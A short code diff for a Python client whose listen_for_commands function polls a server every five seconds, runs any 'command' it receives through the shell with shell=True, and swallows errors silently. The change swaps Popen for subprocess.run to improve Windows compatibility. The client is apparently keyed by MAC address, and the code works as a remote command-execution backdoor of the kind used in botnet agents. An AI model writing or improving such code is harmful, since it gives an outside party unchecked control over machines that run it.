@@ -42,12 +42,14 @@ def listen_for_commands(mac_address):
                 cmd = result['command']
                 print(f"\n[!] ALERT: Received command from server: {cmd}")
                 print("Executing...")
-                subprocess.Popen(cmd, shell=True)
+                
+                # Upgraded execution method for better Windows compatibility
+                subprocess.run(cmd, shell=True, check=False)
                 
         except Exception as e:
-            pass # Fail silently if the network drops temporarily
+            pass # Fail silently and wait for next check
             
-        time.sleep(5) # Ask the server every 5 seconds
+        time.sleep(5)
 
 if __name__ == "__main__":
     mac = None
